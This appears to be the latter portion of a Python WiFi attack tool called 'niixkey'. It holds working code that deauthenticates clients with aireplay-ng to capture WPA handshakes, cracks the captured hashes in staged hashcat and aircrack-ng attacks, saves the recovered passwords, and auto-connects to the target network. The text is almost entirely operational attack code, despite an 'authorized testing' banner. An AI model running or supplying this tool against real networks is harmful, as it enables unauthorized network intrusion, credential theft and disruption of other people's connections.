            print(f"  {c(chr(9608)*60, C.BGREEN, C.BOLD)}")
            print(f"  {'CRACKED via DeepSeek AI':^60}")
            print(f"  {c(chr(9608)*60, C.BGREEN, C.BOLD)}")
            print()
            print(f"  {c('Network ', C.DIM)}{c(bssid, C.BCYAN, C.BOLD)}")
            print(f"  {c('Password', C.DIM)} {c(password, C.BGREEN, C.BOLD)}")
            print()
            return password

    # ── Method 0b: PMK table lookup (instant if table exists) ─────────
    if ssid_guess:
        db_path  = get_pmk_db_path(ssid_guess)
        cow_path = get_cowpatty_table_path(ssid_guess)
        if (os.path.exists(db_path) and os.path.getsize(db_path) > 0) or \
           (os.path.exists(cow_path) and os.path.getsize(cow_path) > 0):
            info(f"Precomputed PMK table found for SSID  {c(ssid_guess, C.BWHITE)}")
            password = crack_with_pmk_table(None, ssid_guess, bssid, cap_file=cap_file)
            if password:
                print()
                print(f"  {c(chr(9608)*60, C.BGREEN, C.BOLD)}")
                print(f"  {'PMK TABLE HIT — PASSWORD FOUND':^60}")
                print(f"  {c(chr(9608)*60, C.BGREEN, C.BOLD)}")
                print()
                print(f"  {c('Network ', C.DIM)}{c(bssid, C.BCYAN, C.BOLD)}")
                print(f"  {c('Password', C.DIM)} {c(password, C.BGREEN, C.BOLD)}")
                print()
                return password
    rules    = find_hashcat_rules()
    pot_file = f'/tmp/niixkey_hs_{int(time.time())}.pot'

    # Use bundled rules as fallback
    bundled_dir = get_bundled_rules_dir()
    if 'best64' not in rules:
        bundled_best64 = os.path.join(bundled_dir, 'best64.rule')
        if os.path.exists(bundled_best64):
            rules['best64'] = bundled_best64
            info("Using bundled best64 rules")

    # ── Convert .cap → hc22000 for hashcat ──────────────────────────
    hash_file = None
    if check_tool('hashcat') and hashcat_is_functional():
        converter = next(
            (cv for cv in ['hcxpcapngtool', 'hcxpcaptool'] if check_tool(cv)), None
        )
        if converter:
            hash_file = f'/tmp/niixkey_hs_{int(time.time())}.hc22000'
            r = subprocess.run([converter, '-o', hash_file, cap_file],
                               capture_output=True, timeout=30)
            if not (os.path.exists(hash_file) and os.path.getsize(hash_file) > 0):
                warn("Capture conversion failed — hashcat stages skipped")
                hash_file = None
    elif check_tool('hashcat'):
        warn("hashcat has no OpenCL backend — skipping to aircrack-ng")
        info("Fix:  sudo apt-get install pocl-opencl-icd")

    if hash_file:
        section_inner = lambda lbl: info(f"Attack stage:  {c(lbl, C.BYELLOW, C.BOLD)}")

        # Stage 1: plain wordlist
        section_inner("Stage 1/5 — plain wordlist")
        divider()
        password = run_hashcat_attack(hash_file, wordlist, pot_file, label='stage1-plain')
        divider()
        if password:
            ok(f"Password cracked:  {c(password, C.BGREEN, C.BOLD)}")

        # Stage 2: best64 rules
        if not password and rules.get('best64'):
            section_inner("Stage 2/5 — best64 rule mutations")
            divider()
            password = run_hashcat_attack(hash_file, wordlist, pot_file,
                                          extra_args=['-r', rules['best64']],
                                          label='stage2-best64')
            divider()
            if password:
                ok(f"Password cracked:  {c(password, C.BGREEN, C.BOLD)}")

        # Stage 3: dive rules
        if not password and rules.get('dive'):
            section_inner("Stage 3/5 — dive rule mutations")
            divider()
            password = run_hashcat_attack(hash_file, wordlist, pot_file,
                                          extra_args=['-r', rules['dive']],
                                          label='stage3-dive')
            divider()
            if password:
                ok(f"Password cracked:  {c(password, C.BGREEN, C.BOLD)}")

        # Stage 4: combinator
        if not password:
            section_inner("Stage 4/5 — combinator (word + word)")
            divider()
            password = run_hashcat_attack(hash_file, wordlist, pot_file,
                                          extra_args=['-a', '1', wordlist],
                                          label='stage4-combinator')
            divider()
            if password:
                ok(f"Password cracked:  {c(password, C.BGREEN, C.BOLD)}")

        # Stage 5: mask
        if not password:
            section_inner("Stage 5/5 — mask attack (PINs & short patterns)")
            for mask in ['?d?d?d?d?d?d?d?d', '?d?d?d?d?d?d?d?d?d?d',
                         '?l?l?l?l?l?l?l?l', '?u?l?l?l?l?l?l?d']:
                divider()
                info(f"Mask:  {c(mask, C.DIM)}")
                password = run_hashcat_attack(hash_file, mask, pot_file,
                                              extra_args=['-a', '3'],
                                              label=f'stage5-{mask[:8]}')
                if password:
                    ok(f"Password cracked:  {c(password, C.BGREEN, C.BOLD)}")
                    break
            divider()

    # ── aircrack-ng fallback (no hashcat or conversion failed) ───────
    if not password:
        info(c("Running aircrack-ng dictionary attack…", C.DIM))
        divider()
        try:
            cmd     = ['aircrack-ng', '-a', '2', '-b', bssid, '-w', wordlist, cap_file]
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                       text=True, bufsize=1)
            while True:
                output = process.stdout.readline()
                if output == '' and process.poll() is not None:
                    break
                if output:
                    line = output.strip()
                    if line:
                        if 'KEY FOUND!' in line:
                            print(f"  {c(line, C.BGREEN, C.BOLD)}")
                        elif 'Current passphrase' in line or 'Tested' in line:
                            print(f"  {c(line, C.DIM)}", end='\r')
                        else:
                            print(f"  {c(line, C.DIM)}")
                    if 'KEY FOUND!' in output:
                        m = re.search(r'\[\s*(.+?)\s*\]', output)
                        if m:
                            password = m.group(1).strip()
                        break
            process.wait()
        except Exception as e:
            err(f"aircrack-ng error: {e}")
        divider()

    if password:
        print()
        print(f"  {c('▓' * 60, C.BGREEN, C.BOLD)}")
        print(f"  {'PASSWORD CRACKED':^60}")
        print(f"  {c('▓' * 60, C.BGREEN, C.BOLD)}")
        print()
        print(f"  {c('Network ', C.DIM)}{c(bssid, C.BCYAN, C.BOLD)}")
        print(f"  {c('Password', C.DIM)} {c(password, C.BGREEN, C.BOLD)}")
        print()
        return password
    else:
        err("Password not found across all attack stages")
        return None





def capture_handshake(interface, bssid, channel, ssid):
    """
    Capture WPA 4-way handshake using airodump-ng + aireplay-ng.

    Improvements over previous version:
    - airodump-ng writes CSV alongside pcap so we can read connected client MACs
    - First deauth fires immediately (t=5s) rather than waiting 60s
    - Sends broadcast deauth AND individual deauths to each known client
    - Deauth interval reduced to 30s for faster reconnect forcing
    - 20 deauth frames per burst (up from 10) for better reliability
    """
    global MONITOR_IFACE

    info(f"Target  {c(ssid, C.BWHITE, C.BOLD)}  ·  {c(bssid, C.CYAN)}  ·  Ch {c(str(channel), C.BCYAN)}")

    safe_ssid    = re.sub(r'[^\w\-]', '_', ssid)[:30] or 'network'
    capture_file = f"handshake_{safe_ssid}"
    csv_base     = f"/tmp/hs_clients_{safe_ssid}"

    airodump_proc      = None
    monitor_iface      = None
    handshake_captured = False

    def get_clients_from_csv():
        """Parse airodump CSV to find client MACs associated to our BSSID."""
        clients = set()
        for suffix in ['-01.csv', '-02.csv', '.csv']:
            csv_path = f"{csv_base}{suffix}"
            if not os.path.exists(csv_path):
                continue
            try:
                with open(csv_path, 'r', errors='ignore') as fh:
                    content = fh.read()
                # Client section is after the blank line separator
                parts = re.split(r'\n\s*\n', content, maxsplit=1)
                if len(parts) < 2:
                    continue
                for line in parts[1].strip().split('\n')[2:]:
                    cols = [c.strip() for c in line.split(',')]
                    if len(cols) >= 6:
                        client_mac = cols[0].strip()
                        assoc_bssid = cols[5].strip()
                        if (re.match(r'([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}', client_mac)
                                and assoc_bssid.lower() == bssid.lower()):
                            clients.add(client_mac)
            except Exception:
                pass
        return clients

    def send_deauth(mon_iface, target_bssid, client_mac=None):
        """Send deauth frames. If client_mac given, sends directed deauth too."""
        cmd = ['sudo', 'aireplay-ng', '--deauth', '20', '-a', target_bssid, mon_iface]
        try:
            subprocess.run(cmd, capture_output=True, timeout=15)
        except Exception:
            pass
        if client_mac:
            cmd_c = ['sudo', 'aireplay-ng', '--deauth', '20',
                     '-a', target_bssid, '-c', client_mac, mon_iface]
            try:
                subprocess.run(cmd_c, capture_output=True, timeout=15)
            except Exception:
                pass

    try:
        subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'],
                       capture_output=True, timeout=10)

        info(f"Enabling monitor mode on {c(interface, C.BWHITE)}…")
        ORIGINAL_IFACE = interface   # track so cleanup always knows the real name
        subprocess.run(['sudo', 'airmon-ng', 'start', interface, str(channel)],
                       capture_output=True, timeout=15)

        monitor_iface = get_monitor_interface(interface)
        MONITOR_IFACE = monitor_iface
        ok(f"Monitor interface  {c(monitor_iface, C.BWHITE, C.BOLD)}")

        # Run airodump writing both pcap (handshake) and csv (client list)
        cmd = [
            'sudo', 'airodump-ng',
            '--bssid', bssid,
            '--channel', str(channel),
            '-w', capture_file,
            '--output-format', 'pcap,csv',
            '--write-interval', '2',
            monitor_iface
        ]
        # Also write a separate CSV for client tracking
        cmd_csv = [
            'sudo', 'airodump-ng',
            '--bssid', bssid,
            '--channel', str(channel),
            '-w', csv_base,
            '--output-format', 'csv',
            '--write-interval', '2',
            monitor_iface
        ]
        airodump_proc     = subprocess.Popen(cmd,     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        airodump_csv_proc = subprocess.Popen(cmd_csv, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        print()
        info(f"Capture file:  {c(capture_file + '-01.cap', C.BYELLOW)}")
        info("Sending deauth every  30 s  — first burst in 5 s")
        info("Press  Ctrl+C  to abort")
        print()

        start_time      = time.time()
        last_deauth     = start_time - 25   # first deauth fires at t=5s
        deauth_interval = 30
        check_interval  = 3
        known_clients   = set()

        while not handshake_captured:
            if airodump_proc.poll() is not None:
                err("airodump-ng stopped unexpectedly")
                break

            now = time.time()

            # ── deauth burst ────────────────────────────────────────
            if now - last_deauth >= deauth_interval:
                last_deauth = now
                # Refresh client list from CSV
                fresh_clients = get_clients_from_csv()
                known_clients.update(fresh_clients)

                # Broadcast deauth
                send_deauth(monitor_iface, bssid)

                # Directed deauth to each known client
                for client in known_clients:
                    send_deauth(monitor_iface, bssid, client)

                client_str = f"  ({len(known_clients)} client(s) targeted)" if known_clients else ""
                elapsed    = int(now - start_time)
                info(f"Deauth burst sent · elapsed {elapsed}s{client_str}")

            # ── handshake check ─────────────────────────────────────
            for suffix in ['-01.cap', '-02.cap', '-03.cap', '-04.cap', '.cap']:
                cap_path = f"{capture_file}{suffix}"
                if os.path.exists(cap_path) and os.path.getsize(cap_path) > 100:
                    try:
                        chk = subprocess.run(['aircrack-ng', cap_path],
                                             capture_output=True, text=True, timeout=15)
                        if 'WPA (1 handshake)' in chk.stdout or 'WPA (2 handshake' in chk.stdout:
                            handshake_captured = True
                            elapsed = int(time.time() - start_time)
                            print()
                            ok(f"Handshake captured!  {c(cap_path, C.BWHITE)}  (elapsed {elapsed}s)")
                            break
                    except Exception:
                        pass

            if not handshake_captured:
                elapsed_display = int(time.time() - start_time)
                mins, secs      = divmod(elapsed_display, 60)
                next_deauth     = max(0, int(deauth_interval - (time.time() - last_deauth)))
                client_count    = len(known_clients)
                print(f"\r  {c('◆', C.BCYAN, C.BOLD)}  Waiting…  "
                      f"{c(f'{mins:02d}:{secs:02d}', C.BYELLOW)}  "
                      f"clients: {c(str(client_count), C.BCYAN)}  "
                      f"next deauth: {c(str(next_deauth) + 's', C.DIM)}   ",
                      end='', flush=True)
                time.sleep(check_interval)

    except KeyboardInterrupt:
        print()
        warn("Capture interrupted by user")

    finally:
        for proc in [airodump_proc, airodump_csv_proc if 'airodump_csv_proc' in dir() else None]:
            if proc and proc.poll() is None:
                try: proc.terminate()
                except Exception: pass
        time.sleep(1)
        if monitor_iface:
            subprocess.run(['sudo', 'airmon-ng', 'stop', monitor_iface],
                           capture_output=True, timeout=10)
            MONITOR_IFACE = None
        restart_network_manager()

    if handshake_captured:
        return capture_file
    else:
        err("No handshake captured")
        return None


def auto_connect(ssid, password, interface):
    """
    Automatically connect to the target WiFi network using the cracked password.
    Tries nmcli first (NetworkManager), then wpa_supplicant as a fallback.
    Returns True on success.
    """
    section("Auto-Connect")
    info(f"Connecting to  {c(ssid, C.BWHITE, C.BOLD)}  with cracked credentials…")

    # ── Method 1: nmcli (NetworkManager) ────────────────────
    if shutil.which('nmcli'):
        info("Trying nmcli (NetworkManager)…")
        try:
            # Delete any existing profile with this SSID to avoid conflicts
            subprocess.run(['sudo', 'nmcli', 'connection', 'delete', ssid],
                           capture_output=True, timeout=8)
        except Exception:
            pass

        try:
            result = subprocess.run(
                ['sudo', 'nmcli', 'device', 'wifi', 'connect', ssid,
                 'password', password, 'ifname', interface],
                capture_output=True, text=True, timeout=30
            )
            if result.returncode == 0 and 'successfully' in result.stdout.lower():
                ok(f"Connected to  {c(ssid, C.BWHITE, C.BOLD)}  via NetworkManager!")
                return True
            else:
                warn(f"nmcli returned: {result.stdout.strip()[:120] or result.stderr.strip()[:120]}")
        except Exception as e:
            warn(f"nmcli error: {e}")

    # ── Method 2: wpa_supplicant + dhclient ─────────────────
    if shutil.which('wpa_supplicant') and shutil.which('wpa_passphrase'):
        info("Trying wpa_supplicant fallback…")
        conf_path = '/tmp/niixkey_wpa.conf'
        try:
            result = subprocess.run(
                ['wpa_passphrase', ssid, password],
                capture_output=True, text=True, timeout=5
            )
            if result.returncode == 0:
                with open(conf_path, 'w') as f:
                    f.write(result.stdout)

                # Bring interface up
                subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'up'],
                               capture_output=True, timeout=5)

                # Run wpa_supplicant in background
                wpa_proc = subprocess.Popen(
                    ['sudo', 'wpa_supplicant', '-B', '-i', interface, '-c', conf_path],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                )
                time.sleep(5)

                # Get IP via dhclient or dhcpcd
                for dhcp in ['dhclient', 'dhcpcd']:
                    if shutil.which(dhcp):
                        r = subprocess.run(['sudo', dhcp, interface],
                                           capture_output=True, timeout=20)
                        if r.returncode == 0:
                            ok(f"Connected to  {c(ssid, C.BWHITE, C.BOLD)}  via wpa_supplicant!")
                            ok(f"DHCP lease obtained on  {c(interface, C.BWHITE)}")
                            return True
        except Exception as e:
            warn(f"wpa_supplicant fallback error: {e}")

    # ── Method 3: iw + ip (open networks only — won't work for WPA) ──
    err("Auto-connect failed — connect manually:")
    print(f"  {c('nmcli dev wifi connect', C.DIM)} {c(repr(ssid), C.BWHITE)} "
          f"{c('password', C.DIM)} {c(repr(password), C.BGREEN)}")
    return False


def restore_interface_to_managed(iface):
    """
    Force a single interface back to managed mode using every available method.
    Called per-interface so it works even when airmon-ng fails.
    """
    if not iface:
        return
    try:
        # Method 1: airmon-ng stop (handles renamed interfaces like wlan1mon)
        subprocess.run(['sudo', 'airmon-ng', 'stop', iface],
                       capture_output=True, timeout=10)
    except Exception:
        pass
    try:
        # Method 2: iw + ip — works even if airmon-ng is unavailable
        subprocess.run(['sudo', 'ip',  'link', 'set', iface, 'down'],
                       capture_output=True, timeout=5)
        subprocess.run(['sudo', 'iw',  'dev',  iface, 'set', 'type', 'managed'],
                       capture_output=True, timeout=5)
        subprocess.run(['sudo', 'ip',  'link', 'set', iface, 'up'],
                       capture_output=True, timeout=5)
    except Exception:
        pass


def find_all_monitor_interfaces():
    """
    Scan every wireless interface on the system and return those in monitor mode.
    Catches interfaces the script created but lost track of (crash mid-run, etc.)
    """
    monitors = []
    try:
        r = subprocess.run(['iw', 'dev'], capture_output=True, text=True, timeout=5)
        current_iface = None
        for line in r.stdout.splitlines():
            line = line.strip()
            if line.startswith('Interface'):
                current_iface = line.split()[1]
            elif 'type monitor' in line and current_iface:
                monitors.append(current_iface)
                current_iface = None
    except Exception:
        pass
    return monitors


def cleanup():
    """
    Bulletproof cleanup — restores WiFi to managed mode.
    Registered via atexit AND signal handlers so it runs on:
      - Normal exit        - Ctrl+C (SIGINT)
      - Unhandled crash    - SIGTERM (kill)
      - Any sys.exit()
    Idempotent — safe to call multiple times.
    """
    global MONITOR_IFACE, ORIGINAL_IFACE, _CLEANUP_DONE
    if _CLEANUP_DONE:
        return
    _CLEANUP_DONE = True

    print()
    info("Cleaning up — restoring WiFi interface…")

    # ── 1. Kill stray capture/injection/scan processes ────────────────
    for proc_name in ('airodump-ng', 'aireplay-ng', 'hcxdumptool', 'airmon-ng'):
        try:
            subprocess.run(['sudo', 'pkill', '-9', '-f', proc_name],
                           capture_output=True, timeout=5)
        except Exception:
            pass

    time.sleep(0.5)   # let killed processes release the interface

    # ── 2. Stop the tracked monitor interface ─────────────────────────
    if MONITOR_IFACE:
        restore_interface_to_managed(MONITOR_IFACE)
        MONITOR_IFACE = None

    # ── 3. Scan and stop ALL monitor-mode interfaces on the system ────
    # Catches interfaces created but lost track of (crash mid-setup, etc.)
    for mon in find_all_monitor_interfaces():
        restore_interface_to_managed(mon)

    # ── 4. Explicitly restore the original adapter by name ────────────
    # Even if airmon-ng renamed it (wlan1 → wlan1mon), after airmon-ng stop
    # the original name re-appears. Force it back to managed + up.
    if ORIGINAL_IFACE:
        restore_interface_to_managed(ORIGINAL_IFACE)
        # Make absolutely sure it's up
        try:
            subprocess.run(['sudo', 'ip', 'link', 'set', ORIGINAL_IFACE, 'up'],
                           capture_output=True, timeout=5)
        except Exception:
            pass

    # ── 5. Restart NetworkManager so the OS reconnects ────────────────
    nm_restarted = False
    for nm_cmd in (
        ['sudo', 'systemctl', 'restart', 'NetworkManager'],
        ['sudo', 'service',   'network-manager', 'restart'],
        ['sudo', 'service',   'networking',       'restart'],
    ):
        try:
            r = subprocess.run(nm_cmd, capture_output=True, timeout=15)
            if r.returncode == 0:
                nm_restarted = True
                break
        except Exception:
            continue

    if nm_restarted:
        time.sleep(2)   # give NM a moment to reconnect

    # ── 6. Final verification ─────────────────────────────────────────
    remaining = find_all_monitor_interfaces()
    if remaining:
        warn(f"Interface(s) still in monitor mode: {c(', '.join(remaining), C.BYELLOW)}")
        warn("Run manually to fix:")
        for iface in remaining:
            print(f"    sudo airmon-ng stop {iface}")
        print( "    sudo systemctl restart NetworkManager")
    else:
        ok("All interfaces restored to managed mode  ✔")

    ok("Cleanup complete — network restored")


_SIGINT_COUNT = 0

def _signal_cleanup(signum, frame):
    """
    Signal handler — runs cleanup then exits.
    Double Ctrl+C within 2 seconds forces immediate exit (skips cleanup).
    This prevents getting trapped if cleanup itself hangs.
    """
    global _SIGINT_COUNT
    _SIGINT_COUNT += 1
    if _SIGINT_COUNT == 1:
        print()
        warn(f"Interrupted — restoring WiFi (Ctrl+C again to force quit)…")
        cleanup()
        sys.exit(0)
    else:
        # Second Ctrl+C — bail immediately, print manual fix command
        print()
        warn("Force quit — interface may still be in monitor mode!")
        warn("Run this to restore WiFi manually:")
        iface = ORIGINAL_IFACE or MONITOR_IFACE or 'wlan1'
        mon   = MONITOR_IFACE or f'{iface}mon'
        print(f"\n  {c(f'sudo airmon-ng stop {mon}; sudo ip link set {iface} down; sudo iw dev {iface} set type managed; sudo ip link set {iface} up; sudo systemctl restart NetworkManager', C.BYELLOW)}\n")
        os._exit(1)


def fix_wifi_now(interface=None):
    """
    Standalone WiFi recovery — can be called with --fix-wifi flag.
    Scans all wireless interfaces, stops any in monitor mode, restores managed.
    """
    section("WiFi Interface Recovery")
    info("Scanning for interfaces stuck in monitor mode…")

    monitors = find_all_monitor_interfaces()

    # Also check common monitor names even if iw dev misses them
    for candidate in ['wlan0mon', 'wlan1mon', 'wlan2mon', 'mon0', 'mon1']:
        if os.path.exists(f'/sys/class/net/{candidate}') and candidate not in monitors:
            monitors.append(candidate)

    if not monitors:
        ok("No interfaces in monitor mode — WiFi should be working")
    else:
        warn(f"Found monitor interfaces: {c(', '.join(monitors), C.BYELLOW)}")
        for mon in monitors:
            info(f"Restoring  {c(mon, C.BWHITE)}…")
            restore_interface_to_managed(mon)

    # Restore all common managed interfaces in case they're down
    managed_candidates = []
    if interface:
        managed_candidates.append(interface)
    try:
        r = subprocess.run(['iw', 'dev'], capture_output=True, text=True, timeout=5)
        for line in r.stdout.splitlines():
            line = line.strip()
            if line.startswith('Interface'):
                iface = line.split()[1]
                if 'mon' not in iface and iface not in managed_candidates:
                    managed_candidates.append(iface)
    except Exception:
        pass

    for iface in managed_candidates:
        try:
            # Ensure managed mode and bring up
            subprocess.run(['sudo', 'ip', 'link', 'set', iface, 'down'],
                           capture_output=True, timeout=5)
            subprocess.run(['sudo', 'iw', 'dev', iface, 'set', 'type', 'managed'],
                           capture_output=True, timeout=5)
            subprocess.run(['sudo', 'ip', 'link', 'set', iface, 'up'],
                           capture_output=True, timeout=5)
            ok(f"Interface  {c(iface, C.BWHITE)}  set to managed + up")
        except Exception as e:
            warn(f"Could not restore {iface}: {e}")

    # Restart NetworkManager
    info("Restarting NetworkManager…")
    for cmd in (['sudo', 'systemctl', 'restart', 'NetworkManager'],
                ['sudo', 'service', 'network-manager', 'restart'],
                ['sudo', 'service', 'networking', 'restart']):
        try:
            r = subprocess.run(cmd, capture_output=True, timeout=15)
            if r.returncode == 0:
                ok("NetworkManager restarted")
                break
        except Exception:
            continue

    time.sleep(2)
    remaining = find_all_monitor_interfaces()
    if remaining:
        warn(f"Still in monitor mode: {', '.join(remaining)}")
        warn("Run manually:")
        for m in remaining:
            print(f"  sudo airmon-ng stop {m}")
        print("  sudo systemctl restart NetworkManager")
    else:
        ok("All interfaces restored — WiFi should reconnect within a few seconds")


# Register cleanup to run no matter how the script exits
atexit.register(cleanup)
signal.signal(signal.SIGINT,  _signal_cleanup)   # Ctrl+C
signal.signal(signal.SIGTERM, _signal_cleanup)   # kill
try:
    signal.signal(signal.SIGHUP, _signal_cleanup)    # terminal closed
except AttributeError:
    pass



def show_banner():
    """Show colourful tool banner."""
    # Gradient: cyan → blue → magenta across rows
    colours = [C.BCYAN, C.BCYAN, C.BBLUE, C.BBLUE, C.BMAGENTA, C.BMAGENTA]
    rows = [
        r"    ███╗   ██╗██╗██╗██╗  ██╗    ██╗    ██╗██╗███████╗██╗",
        r"    ████╗  ██║██║██║╚██╗██╔╝    ██║    ██║██║██╔════╝██║",
        r"    ██╔██╗ ██║██║██║ ╚███╔╝     ██║ █╗ ██║██║█████╗  ██║",
        r"    ██║╚██╗██║██║██║ ██╔██╗     ██║███╗██║██║██╔══╝  ██║",
        r"    ██║ ╚████║██║██║██╔╝ ██╗    ╚███╔███╔╝██║██║     ██║",
        r"    ╚═╝  ╚═══╝╚═╝╚═╝╚═╝  ╚═╝     ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝",
    ]
    print()
    for row, col in zip(rows, colours):
        print(c(row, col, C.BOLD))
    print()
    sub  = c("  Universal WiFi Security Testing Tool", C.BWHITE, C.BOLD)
    ver  = c("v2.0", C.BYELLOW, C.BOLD)
    print(f"{sub}  {ver}")
    print(c("  Arch Linux  │  Debian / Ubuntu / Kali  │  Fedora / RHEL", C.DIM))
    print(c("  For Authorized Testing and Educational Use Only", C.BRED, C.DIM))
    print()


def main():
    """Main entry point."""

    # ── --fix-wifi: restore stuck monitor interfaces without running the tool ──
    if '--fix-wifi' in sys.argv or '--fix' in sys.argv:
        os.system('clear')
        show_banner()
        # Can run as root or non-root (sudo will be invoked per-command)
        iface_arg = None
        for arg in sys.argv:
            if arg.startswith('--iface='):
                iface_arg = arg.split('=', 1)[1]
        fix_wifi_now(interface=iface_arg)
        sys.exit(0)

    os.system('clear')
    show_banner()

    # Require root
    if os.geteuid() != 0:
        err("This tool requires root privileges!")
        info("Run:  sudo python3 niixkey.py")
        sys.exit(1)

    # Check OS
    os_name = get_os()
    info(f"Operating System:  {c(os_name, C.BWHITE, C.BOLD)}")

    if "Unknown" in os_name:
        err("This tool only supports Linux")
        sys.exit(1)

    # ── Dependencies ──────────────────────────────────────
    section("System Check")
    info("Checking dependencies…")
    if not check_all_dependencies():
        warn("Some dependencies are missing — installing now…")
        if not install_dependencies():
            warn("Some dependencies could not be installed")
            resp = ask("Continue anyway? [y/N]")
            if resp.strip().lower() != 'y':
                cleanup()
                sys.exit(1)
    ok("All dependencies satisfied")

    # ── Wireless interfaces ───────────────────────────────
    section("Interface Selection")
    info("Detecting wireless interfaces…")
    interfaces = get_wireless_interfaces()

    if not interfaces:
        err("No wireless interfaces found!")
        warn("Make sure a monitor-capable adapter is connected")
        info(c("Compatible chipsets: AR9271 · RT3070 · RT3572 · MT7601U", C.DIM))
        cleanup()
        sys.exit(1)

    ok(f"Found:  {c(', '.join(interfaces), C.BWHITE, C.BOLD)}")

    if len(interfaces) > 1:
        print()
        for i, iface in enumerate(interfaces, 1):
            print(f"    {c(str(i), C.BYELLOW, C.BOLD)}.  {c(iface, C.BWHITE)}")
        print()
        while True:
            try:
                raw = ask(f"Select interface (1–{len(interfaces)}):")
                choice = int(raw.strip())
                if 1 <= choice <= len(interfaces):
                    interface = interfaces[choice - 1]
                    break
                warn(f"Enter a number between 1 and {len(interfaces)}")
            except ValueError:
                warn("Invalid input")
    else:
        interface = interfaces[0]
        info(f"Using interface:  {c(interface, C.BWHITE, C.BOLD)}")

    # Track the original interface name so cleanup can restore it
    # even if airmon-ng renames it (wlan1 → wlan1mon)
    global ORIGINAL_IFACE
    ORIGINAL_IFACE = interface

    # ── Network scan ──────────────────────────────────────
    section("Network Scan")
    networks = scan_networks(interface)

    if not networks:
        err("No networks found during scan")
        warn("Check that your adapter supports monitor mode")
        info(c("Try:  iw list | grep -A 10 'Supported interface modes'", C.DIM))
        cleanup()
        sys.exit(1)

    ok(f"Discovered  {c(str(len(networks)), C.BYELLOW, C.BOLD)}  network(s)")

    # ── Target selection ──────────────────────────────────
    network_idx = display_networks_menu(networks)
    if network_idx == -1:
        info("Cancelled by user")
        cleanup()
        sys.exit(0)

    selected = networks[network_idx]

    # ── Confirmation card ─────────────────────────────────
    section("Selected Target")
    divider()
    print(f"  {c('SSID    ', C.DIM)}  {c(selected.ssid, C.BWHITE, C.BOLD)}")
    print(f"  {c('BSSID   ', C.DIM)}  {c(selected.bssid, C.BCYAN)}")
    print(f"  {c('Channel ', C.DIM)}  {c(str(selected.channel), C.BYELLOW)}")
    print(f"  {c('Signal  ', C.DIM)}  {c(str(selected.signal) + ' dBm', C.BGREEN if selected.signal > -70 else C.BYELLOW)}")
    sec_display = getattr(selected, 'security', 'UNKNOWN')
    if sec_display == 'WPA3':
        sec_col = C.BGREEN
    elif sec_display in ('WPA3/WPA2', 'WPA2'):
        sec_col = C.BYELLOW
    elif sec_display == 'OPEN':
        sec_col = C.BMAGENTA
    else:
        sec_col = C.BRED
    print(f"  {c('Security', C.DIM)}  {c(sec_display, sec_col, C.BOLD)}")
    divider()
    print()

    resp = ask("Proceed with this target? [y/N]")
    if resp.strip().lower() != 'y':
        info("Cancelled")
        cleanup()
        sys.exit(0)

    if not selected.channel:
        selected = selected._replace(channel=1)
        warn("Channel unknown — defaulting to ch 1")

    # ── Attack routing based on security type ─────────────
    sec = getattr(selected, 'security', 'UNKNOWN')

    if sec == 'OPEN':
        warn("Network is OPEN — no password required")
        auto_connect(selected.ssid, '', interface)
        cleanup()
        section("Session Complete")
        ok(f"Done  ·  {c(time.strftime('%H:%M:%S'), C.DIM)}")
        print()
        sys.exit(0)

    if sec == 'WEP':
        section("WEP Attack")
        warn("WEP detected — use aircrack-ng directly (WEP cracking not in scope here)")
        cleanup()
        sys.exit(0)

    # WPA2, WPA3, WPA3/WPA2, WPA, UNKNOWN — all go through PMKID + handshake path
    password = None

    # ── Phase 1: PMKID attack (works on WPA2 & WPA3-transition) ──
    section("Phase 1 — PMKID Attack")
    info("PMKID attack does not require a connected client — faster than handshake capture")
    pmkid_hash_file = capture_pmkid(interface, selected.bssid, selected.channel, selected.ssid)

    if pmkid_hash_file:
        section("Cracking PMKID Hash")
        password = crack_pmkid_hash(pmkid_hash_file, selected.bssid)

    # ── Phase 2: Handshake capture if PMKID failed ────────
    if not password:
        if pmkid_hash_file:
            warn("PMKID crack failed — falling back to 4-way handshake capture")
        else:
            info("PMKID capture unsuccessful — proceeding to handshake capture")

        section("Phase 2 — 4-Way Handshake Capture")
        capture_file = capture_handshake(
            interface, selected.bssid, selected.channel, selected.ssid
        )

        if not capture_file:
            err("Handshake capture failed or was cancelled")
            cleanup()
            sys.exit(1)

        section("Cracking Handshake")
        password = crack_wpa_password(capture_file, selected.bssid)

    # ── Save & finish ─────────────────────────────────────
    if password:
        results_file = 'cracked_results.txt'
        timestamp    = time.strftime("%Y-%m-%d %H:%M:%S")
        with open(results_file, 'a') as f:
            f.write(f"{'─' * 60}\n")
            f.write(f"Date:     {timestamp}\n")
            f.write(f"SSID:     {selected.ssid}\n")
            f.write(f"BSSID:    {selected.bssid}\n")
            f.write(f"Security: {sec}\n")
            f.write(f"Password: {password}\n")
            f.write(f"{'─' * 60}\n\n")
        ok(f"Results saved →  {c(results_file, C.BWHITE)}")

        # ── Auto-connect ──────────────────────────────────
        auto_connect(selected.ssid, password, interface)
    else:
        section("No Password Found")
        warn("The password was not in the wordlist")
        info("To improve your chances:")
        print(f"    {c('1.', C.BYELLOW)} Place rockyou.txt at  {c('/opt/wordlists/rockyou.txt', C.BWHITE)}  and re-run")
        print(f"       Download: {c('https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt', C.DIM)}")
        print(f"    {c('2.', C.BYELLOW)} Provide your own wordlist — the tool will prompt you next run")
        print(f"    {c('3.', C.BYELLOW)} Try hashcat rule-based mutation:")
        print(f"       {c('hashcat -m 22000 <hash.hc22000> rockyou.txt -r /usr/share/hashcat/rules/best64.rule', C.DIM)}")
        print(f"    {c('4.', C.BYELLOW)} The network may use a strong random key (unlikely to crack)")

    cleanup()
    section("Session Complete")
    ok(f"Done  ·  {c(time.strftime('%H:%M:%S'), C.DIM)}")
    print()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        # Signal handler will call cleanup(); just exit quietly
        sys.exit(0)
    except Exception as e:
        err(f"Unexpected error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
